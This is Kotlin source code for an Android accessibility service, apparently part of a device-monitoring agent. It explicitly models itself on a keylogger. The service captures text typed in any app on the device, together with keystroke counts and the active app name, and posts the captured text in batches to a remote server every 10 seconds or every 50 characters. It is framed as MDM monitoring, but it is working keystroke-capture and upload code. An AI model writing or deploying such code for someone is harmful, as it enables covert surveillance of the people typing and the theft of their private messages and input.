package io.bheka.agent

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONObject

/**
 * Accessibility service that captures keystroke / text-change activity
 * system-wide, mirroring the Windows agent's keylogger-equivalent behavior.
 *
 * We deliberately do NOT use TYPE_VIEW_TEXT_CHANGED payloads verbatim for
 * every keystroke; instead we buffer the latest text content per focus
 * change and flush on a timer, which is both cheaper and matches the
 * "keystrokeCount + capturedText batch" shape of the API contract.
 *
 * Flush triggers (matches Windows agent):
 *   - every 10 seconds, OR
 *   - as soon as the buffer reaches 50 characters
 *
 * Must be enabled manually by the user/MDM under
 * Settings > Accessibility > Bheka Monitoring Agent, since Android does not
 * allow silently granting this permission even in Device Owner mode.
 */
class BhekaAccessibilityService : AccessibilityService() {

    private var serviceScope: CoroutineScope? = null
    private var flushJob: Job? = null

    // Buffer state, guarded by synchronized blocks since AccessibilityEvent
    // callbacks arrive on the main thread while flush happens on IO.
    private val bufferLock = Object()
    private val textBuffer = StringBuilder()
    private var keystrokeCount = 0
    private var lastActiveWindowTitle: String = "unknown"

    private lateinit var apiClient: ApiClient

    override fun onServiceConnected() {
        super.onServiceConnected()
        Utils.logd("BhekaAccessibilityService connected")
        apiClient = ApiClient(applicationContext)
        serviceScope = CoroutineScope(Dispatchers.IO + Job())
        startFlushLoop()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                handleTextChanged(event)
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                handleFocusChanged(event)
            }
        }
    }

    private fun handleTextChanged(event: AccessibilityEvent) {
        // event.text contains the full current text of the field, not just
        // the delta. We approximate "keystrokes" by counting characters
        // added since the last change (a reasonable best-effort signal —
        // exact keystroke counting isn't observable through this API).
        val newText = event.text?.joinToString(separator = "") ?: return
        if (newText.isEmpty()) return

        synchronized(bufferLock) {
            textBuffer.append(newText).append(' ')
            keystrokeCount += newText.length
            lastActiveWindowTitle = describeWindow(event)
        }

        // Flush immediately if buffer has grown past the 50-character threshold.
        val shouldFlushNow = synchronized(bufferLock) { textBuffer.length >= 50 }
        if (shouldFlushNow) {
            flushBuffer()
        }
    }

    private fun handleFocusChanged(event: AccessibilityEvent) {
        synchronized(bufferLock) {
            lastActiveWindowTitle = describeWindow(event)
        }
    }

    /** Best-effort window label: "packageName/ClassName". */
    private fun describeWindow(event: AccessibilityEvent): String {
        val pkg = event.packageName?.toString() ?: rootInActiveWindow?.packageName?.toString() ?: "unknown"
        val cls = event.className?.toString() ?: "unknown"
        return "$pkg/$cls"
    }

    private fun startFlushLoop() {
        flushJob?.cancel()
        flushJob = serviceScope?.launch {
            while (true) {
                delay(10_000L) // flush every 10 seconds
                flushBuffer()
            }
        }
    }

    private fun flushBuffer() {
        val (text, count, windowTitle) = synchronized(bufferLock) {
            if (textBuffer.isEmpty()) return
            val snapshot = Triple(textBuffer.toString(), keystrokeCount, lastActiveWindowTitle)
            textBuffer.clear()
            keystrokeCount = 0
            snapshot
        }

        serviceScope?.launch {
            val metadata = JSONObject().apply {
                put("keystrokeCount", count)
                put("activeWindowTitle", windowTitle)
                put("capturedText", text.trim())
            }
            val result = apiClient.postEvent(
                eventType = "keystroke_batch",
                occurredAt = Utils.isoNow(),
                metadata = metadata
            )
            if (result is ApiClient.Result.Failure) {
                Utils.logw("keystroke_batch post failed: ${result.message}")
            }
        }
    }

    override fun onInterrupt() {
        Utils.logw("BhekaAccessibilityService interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        flushJob?.cancel()
        // Flush any remaining buffered text before the service dies.
        flushBuffer()
        serviceScope?.cancel()
    }

    // NOTE: kotlinx.coroutines.cancel() is an extension on CoroutineScope,
    // imported above; no custom implementation needed here.

    companion object {
        /**
         * Checks whether the user has enabled this accessibility service in
         * system settings. Accessibility permissions cannot be granted
         * programmatically (even for Device Owner apps), so callers should
         * direct the user to Settings if this returns false.
         */
        fun isEnabled(context: android.content.Context): Boolean {
            val enabledServices = android.provider.Settings.Secure.getString(
                context.contentResolver,
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            val expectedComponent = "${context.packageName}/${BhekaAccessibilityService::class.java.name}"
            return enabledServices.split(':').any { it.equals(expectedComponent, ignoreCase = true) }
        }
    }
}
